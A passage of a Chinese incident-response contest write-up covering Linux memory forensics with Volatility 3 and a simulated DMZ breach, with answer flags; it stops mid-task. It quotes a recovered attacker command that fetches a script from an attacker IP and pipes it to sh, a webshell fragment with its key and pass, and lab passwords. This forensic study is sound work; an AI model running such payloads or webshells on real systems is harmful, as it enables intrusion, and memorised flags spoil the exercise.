+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326180435358.png" alt=""></p>
+<p>有两个，logontype都是3
+试出来是03秒的那个</p>
+<pre tabindex="0"><code>flag{2025/12/17 15:06:03}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务7"
+    >
+        任务7
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务7" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务7" aria-label="Anchor to: 任务7" href="#%e4%bb%bb%e5%8a%a17">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：任务7
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">攻击者为了确保服务器重启后仍能控制机器，在系统中留下了三个持久化后门。 请找到这三处隐藏的字符串，并按以下顺序拼接：flag{flag1flag2flag3}
+</span></span></code></pre></div><p>接上题，往上翻可以直接定位到设置flag的日志</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326180652643.png" alt=""></p>
+<pre tabindex="0"><code>flag{krjl424wq3453dalbzlmqu458xktq}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h2 id="solar内存取证"
+    >
+        Solar内存取证
+    </h2>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#solar内存取证" class="gdoc-page__anchor clip flex align-center" title="Anchor to: Solar内存取证" aria-label="Anchor to: Solar内存取证" href="#solar%e5%86%85%e5%ad%98%e5%8f%96%e8%af%81">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="linux内存取证"
+    >
+        linux内存取证
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#linux内存取证" class="gdoc-page__anchor clip flex align-center" title="Anchor to: linux内存取证" aria-label="Anchor to: linux内存取证" href="#linux%e5%86%85%e5%ad%98%e5%8f%96%e8%af%81">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<blockquote>
+<p>[!NOTE] Tips
+Linux内存和Windows内存差别极大，最好使用vol3来取证，还需要准备对应内核的符号表的流程等</p>
+</blockquote>
+<div class="flex align-center gdoc-page__anchorwrap">
+    <h4 id="确定linux内核"
+    >
+        确定linux内核
+    </h4>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#确定linux内核" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 确定linux内核" aria-label="Anchor to: 确定linux内核" href="#%e7%a1%ae%e5%ae%9alinux%e5%86%85%e6%a0%b8">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<pre tabindex="0"><code>python vol.py -f linux.lime banners.Banners
+</code></pre><p><img src="%E7%AC%94%E8%AE%B0.md_Attachments/%E7%AC%94%E8%AE%B0-20260326191916401.png" alt=""></p>
+<pre tabindex="0"><code>Linux version 6.8.0-49-generic
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h4 id="准备和内核完全匹配的linux-symbols重点"
+    >
+        准备和内核完全匹配的Linux symbols(重点)
+    </h4>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#准备和内核完全匹配的linux-symbols重点" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 准备和内核完全匹配的Linux symbols(重点)" aria-label="Anchor to: 准备和内核完全匹配的Linux symbols(重点)" href="#%e5%87%86%e5%a4%87%e5%92%8c%e5%86%85%e6%a0%b8%e5%ae%8c%e5%85%a8%e5%8c%b9%e9%85%8d%e7%9a%84linux-symbols%e9%87%8d%e7%82%b9">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<p>Volatility 3 分析 Linux 内存，不像 Windows 那样很多东西自动给你喂好
+它需要知道：</p>
+<ul>
+<li>内核结构体长什么样</li>
+<li>偏移是多少</li>
+<li>符号地址在哪里</li>
+</ul>
+<p>这些信息要靠 <strong>symbol table</strong></p>
+<p>而 symbol table 通常是拿这两个东西用 <code>dwarf2json</code> 生成的：</p>
+<ul>
+<li><code>System.map-6.8.0-49-generic</code></li>
+<li><code>vmlinux-6.8.0-49-generic</code></li>
+</ul>
+<p>其中最关键的是那个 <strong>带调试信息的 <code>vmlinux</code></strong></p>
+<p>因此这里从 Ubuntu 的 debug symbol 仓库，下载 6.8.0-49-generic 这个内核对应的调试包</p>
+<pre tabindex="0"><code>wget -c --content-disposition http://ddebs.ubuntu.com/pool/main/l/linux/linux-image-unsigned-6.8.0-49-generic-dbgsym_6.8.0-49.49_amd64.ddeb
+</code></pre><p>这个 <code>.ddeb</code> 文件本质上是 Ubuntu 的 <strong>调试符号包</strong>，里面通常就有需要的</p>
+<pre tabindex="0"><code>/usr/lib/debug/boot/vmlinux-6.8.0-49-generic
+</code></pre><p>然后起docker创建一个和内核版本相同的环境用于处理调试包</p>
+<pre tabindex="0"><code>Ubuntu 24.04 默认主线 GA 内核就是 6.8 系列
+docker run -it --rm -v $PWD:/volatility ubuntu:24.04 /bin/bash
+</code></pre><p>上面的命令会直接进入docker的/bin/bash
+并且将当前目录挂载到容器的/volatility</p>
+<ul>
+<li>宿主机当前目录里的文件</li>
+<li>在容器里会出现在 <code>/volatility</code></li>
+</ul>
+<p>这样你在容器里生成的文件，宿主机也能看到
+当前目录最好有dwarf2json
+不然还得在docker里装</p>
+<pre tabindex="0"><code>进入挂载目录
+cd /volatility
+
+解压 `.ddeb`
+mkdir extracted
+dpkg-deb -x linux-image-unsigned-6.8.0-49-generic-dbgsym_6.8.0-49.49_amd64.ddeb extracted
+
+在类似目录中找到
+/volatility/extracted/usr/lib/debug/boot/vmlinux-6.8.0-49-generic
+
+当前目录没有dwarf2json的要先下载
+wget -O dwarf2json https://github.com/volatilityfoundation/dwarf2json/releases/latest/download/dwarf2json-linux-amd64
+chmod +x dwarf2json
+
+然后用dwarf2json
+./dwarf2json linux --elf /volatility/extracted/usr/lib/debug/boot/vmlinux-6.8.0-49-generic &gt; linux-image-6.8.0-49-generic.json
+
+只要你的调试版 `vmlinux` 里符号和 DWARF 都完整，单独用它就能产出可用的 symbol table
+不一定需要system.map
+
+最后exit退出docker
+</code></pre><p>最后将这个json导入vol3</p>
+<pre tabindex="0"><code>cp linux-image-6.8.0-49-generic.json volatility3/symbols/linux
+这里的完整路径是~/volatility3/volatility3/symbols/linux
+</code></pre><p>检验是否成功导入</p>
+<pre tabindex="0"><code>python3 vol.py isfinfo | grep -i &#39;6.8.0-49&#39;
+</code></pre><p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%94%E8%AE%B0-20260326212010631.png" alt=""></p>
+<div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务1-1"
+    >
+        任务1
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务1-1" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务1" aria-label="Anchor to: 任务1" href="#%e4%bb%bb%e5%8a%a11-1">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：攻击者使用什么漏洞入侵了服务器
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">注意：flag格式flag{CVE-2025-12345}
+</span></span></code></pre></div><p>看下进程</p>
+<pre tabindex="0"><code>python3 vol.py -f ubuntu_24_04_6_8_0.lime linux.pstree
+</code></pre><p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326215813468.png" alt=""></p>
+<p>很明显的利用链
+还看到一个java服务</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326220824167.png" alt=""></p>
+<p>psaux看下启动命令，看看具体是什么服务</p>
+<pre tabindex="0"><code>python3 vol.py -f ubuntu_24_04_6_8_0.lime linux.psaux | grep &#34;4325&#34;
+</code></pre><p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326221842444.png" alt=""></p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326221934546.png" alt=""></p>
+<p>看到是Apache ActiveMQ服务，找一下cve</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326222031214.png" alt=""></p>
+<p>找到rce漏洞</p>
+<pre tabindex="0"><code>flag{CVE-2023-46604}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务2-1"
+    >
+        任务2
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务2-1" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务2" aria-label="Anchor to: 任务2" href="#%e4%bb%bb%e5%8a%a12-1">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：攻击者的服务器IP
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">注意：flag格式flag{123.123.123.123}
+</span></span></code></pre></div><p>直接看网络</p>
+<pre tabindex="0"><code>python3 vol.py -f ubuntu_24_04_6_8_0.lime linux.sockstat | grep &#34;ESTABLISHED&#34;
+</code></pre><p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326222655165.png" alt=""></p>
+<p>名为4的进程就是rce连接</p>
+<pre tabindex="0"><code>flag{199.68.217.92}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务3-1"
+    >
+        任务3
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务3-1" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务3" aria-label="Anchor to: 任务3" href="#%e4%bb%bb%e5%8a%a13-1">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：攻击者执行的载荷命令
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">flag不包含空格，以flag{}包裹
+</span></span></code></pre></div><p>先查历史命令</p>
+<pre tabindex="0"><code>python3 vol.py -f ubuntu_24_04_6_8_0.lime linux.bash
+</code></pre><p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326222909738.png" alt=""></p>
+<p>历史被删了，有点难办
+那只能通过strings扫描原始镜像，筛选攻击者ip</p>
+<pre tabindex="0"><code>strings ubuntu_24_04_6_8_0.lime | grep &#34;199.68.217.92&#34;
+</code></pre><p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326223107041.png" alt=""></p>
+<p>找到执行的载荷</p>
+<pre tabindex="0"><code>flag{(curl-fsSL-m180http://199.68.217.92:61231/slt||wget-T180-qhttp://199.68.217.92:61231/slt)|sh}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务4-1"
+    >
+        任务4
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务4-1" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务4" aria-label="Anchor to: 任务4" href="#%e4%bb%bb%e5%8a%a14-1">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：攻击者进行权限维持可疑的服务路径
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">flag格式flag{/tmp/123}
+</span></span></code></pre></div><p>在Linux权限维持中，攻击者常将恶意二进制文件注册为系统服务</p>
+<p>直接列出所有在内存文件缓存中记录的服务文件</p>
+<pre tabindex="0"><code>python3 vol.py -f ubuntu_24_04_6_8_0.lime linux.pagecache.Files | grep &#34;/etc/systemd/system/&#34;
+</code></pre><p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326224121989.png" alt=""></p>
+<p>只有这个是在25年被修改过的，应该是这个</p>
+<blockquote>
+<p>[!NOTE] 官方wp
+其中dhclient.service被多次展示，并且该服务在 Ubuntu 24.04 的标准 systemd 架构中并不存在。其位置、命名方式及内存引用特征，表明该 unit 极可能由攻击者创建</p>
+</blockquote>
+<pre tabindex="0"><code>flag{/etc/systemd/system/dhclient.service}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务5-1"
+    >
+        任务5
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务5-1" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务5" aria-label="Anchor to: 任务5" href="#%e4%bb%bb%e5%8a%a15-1">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：攻击者创建了拥有root权限的账户
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">flag格式flag{ubuntu}
+</span></span></code></pre></div><p>因为linux没有像windows那样hashdump的插件
+因此这里用strings查看会快很多</p>
+<pre tabindex="0"><code>strings ubuntu_24_04_6_8_0.lime | grep &#34;/etc/passwd&#34;
+</code></pre><p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260326224711845.png" alt=""></p>
+<p>能看到有test和ubunto用户创建了root账号
+测试出来是ubunto用户</p>
+<pre tabindex="0"><code>flag{ubunto}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h2 id="仿真dmz环境应急响应"
+    >
+        仿真DMZ环境应急响应
+    </h2>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#仿真dmz环境应急响应" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 仿真DMZ环境应急响应" aria-label="Anchor to: 仿真DMZ环境应急响应" href="#%e4%bb%bf%e7%9c%9fdmz%e7%8e%af%e5%a2%83%e5%ba%94%e6%80%a5%e5%93%8d%e5%ba%94">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">仿真DMZ环境应急响应
+</span></span><span class="line"><span class="cl">描述：
+</span></span><span class="line"><span class="cl">本次环境取自于实际应用中dmz隔离，仿真模拟了(生产车间/测试车间)环境，其中Windows server 2019系统为主要突破点，此机器搭建了一个对外开放的论坛，以便于让员工、客户等能够及时看到企业动态
+</span></span><span class="line"><span class="cl">由于企业对于网络安全疏忽，未对生产车间及其它区域服务器做物理隔离，导致攻击者以Windows server 2019系统(DMZ1)为突破口攻击成功，获取终端权限后，攻击者未收手，而是进行内网漏洞扫描，拿下另一台Ubuntu(DMZ2)的机器，并做了权限维持操作，请根据题目描述依次排查进行学习
+</span></span><span class="line"><span class="cl">注意：这些攻击都是在无安全设备的情况下进行的，所以在实战中遇到需根据日志及可能存在的漏洞去判断、测试、复盘等条件总结
+</span></span><span class="line"><span class="cl">注意：web日志与系统日志有时区差别，这也仿真了在实战中一些开放配置不当导致的溯源难度加大问题
+</span></span><span class="line"><span class="cl">机器1：Windows server 2019(双网卡)，账号密码：administrator/Solarsec521
+</span></span><span class="line"><span class="cl">机器2：Ubuntu(单网卡)，账号密码：root/Solarsec521
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">下载地址：https://pan.baidu.com/s/1kM2ojRM7QvsZvwbejqE4gQ 提取码: ek24
+</span></span><span class="line"><span class="cl">备用下载：https://pan.quark.cn/s/5a03e0a6611b
+</span></span><span class="line"><span class="cl">提取码：KHeA
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">解压密码：HHsolar88*90
+</span></span></code></pre></div><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务1-2"
+    >
+        任务1
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务1-2" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务1" aria-label="Anchor to: 任务1" href="#%e4%bb%bb%e5%8a%a11-2">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：排查漏洞
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">根据开放服务排查审计日志，提交攻击者利用漏洞传入webshell的url，提交示例：flag{/flag/abc/kk=abc}
+</span></span></code></pre></div><p>工具里提供了D盾，倒是方便了
+扫出webshell得到后门路径</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260327144209883.png" alt=""></p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260327145058287.png" alt=""></p>
+<p>inetpub是标准IIS服务特征
+在里面找到日志文件</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260327144806561.png" alt=""></p>
+<p>可以在1224的日志里发现找到的webshell
+在访问webshell的日志前能看到POST请求
+POST请求用于上传webshell
+符合flag格式</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260327145025417.png" alt=""></p>
+<pre tabindex="0"><code>flag{/plugins/Ueditor/net/controller.ashx action=catchimage}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务2-2"
+    >
+        任务2
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务2-2" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务2" aria-label="Anchor to: 任务2" href="#%e4%bb%bb%e5%8a%a12-2">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：Windows defender专项
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">提交Windows defender病毒和威胁防护中，拦截攻击者最早执行的命令，提交示例：flag{dir}
+</span></span></code></pre></div><pre tabindex="0"><code>应用程序和服务日志
+└─ Microsoft
+   └─ Windows
+      └─ Windows Defender Firewall with Advanced Security
+         ├─ Firewall          # 常规防火墙事件（默认启用）
+         ├─ FirewallVerbose  # 详细日志（需手动启用）
+         └─ ConnectionSecurity # IPsec/连接安全规则事件
+      └─ Windows Defender
+         └─ Operational  # 核心操作日志（扫描、检测、处理、更新）
+</code></pre><p>到Operational的核心操作日志里找病毒防护相关内容
+根据前面的日志先定位到12/24
+然后事件ID 1116为检测到威胁</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260327150516516.png" alt=""></p>
+<pre tabindex="0"><code>flag{whoami}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务3-2"
+    >
+        任务3
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务3-2" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务3" aria-label="Anchor to: 任务3" href="#%e4%bb%bb%e5%8a%a13-2">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：Windows defender专项
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">提交Windows defender病毒和威胁防护中，杀软隔离的第一个webshell文件，提交文件名，提交示例：flag{shell.php}
+</span></span></code></pre></div><p>事件ID 1117为处理威胁
+往后翻翻找到webshell</p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260327151021275.png" alt=""></p>
+<p><img src="/incident-response/solar2/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B.md_Attachments/%E7%AC%AC%E4%BA%8C%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-20260327151200860.png" alt=""></p>
+<pre tabindex="0"><code>flag{6390217215502412559088650.aspx}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务4-2"
+    >
+        任务4
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务4-2" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务4" aria-label="Anchor to: 任务4" href="#%e4%bb%bb%e5%8a%a14-2">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：日志专项
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">审计web日志，攻击者在多次上传webshell后，最终远控使用的webshell文件是哪个，提交文件名，提交示例：flag{shell.php}
+</span></span></code></pre></div><p>直接看日志，最后多次使用的是哪个webshell</p>
+<pre tabindex="0"><code>flag{6390217325293187938071651.aspx}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务5-2"
+    >
+        任务5
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务5-2" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务5" aria-label="Anchor to: 任务5" href="#%e4%bb%bb%e5%8a%a15-2">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：木马专项
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
+</span></span><span class="line"><span class="cl">提交攻击者最终使用的webshell中key和pass，提交示例：flag{key&amp;pass}
+</span></span></code></pre></div><p>webshell内容如下</p>
+<pre tabindex="0"><code>&lt;%@ Page Language=&#34;C#&#34;%&gt;&lt;%try { string key = &#34;3c6e0b8a9c15224a&#34;; string pass = &#34;solar&#34;; string md5 = 。。。
+%&gt;
+</code></pre><p>前几行就有pass和key
+尝试后发现不正确，可能还上传或制作了其他木马？</p>
+<p>哦，我明白了，ai分析了下木马
+webshell 的 key 是 md5 加密的，解密后字符为 key</p>
+<pre tabindex="0"><code>flag{key&amp;solar}
+</code></pre><div class="flex align-center gdoc-page__anchorwrap">
+    <h3 id="任务6-1"
+    >
+        任务6
+    </h3>
+    <a data-clipboard-text="http://localhost:1313/incident-response/solar2/#任务6-1" class="gdoc-page__anchor clip flex align-center" title="Anchor to: 任务6" aria-label="Anchor to: 任务6" href="#%e4%bb%bb%e5%8a%a16-1">
+        <svg class="gdoc-icon gdoc_link"><use xlink:href="#gdoc_link"></use></svg>
+    </a>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">任务名称：远控专项
+</span></span><span class="line"><span class="cl">任务分数：2.00
+</span></span><span class="line"><span class="cl">任务类型：静态Flag
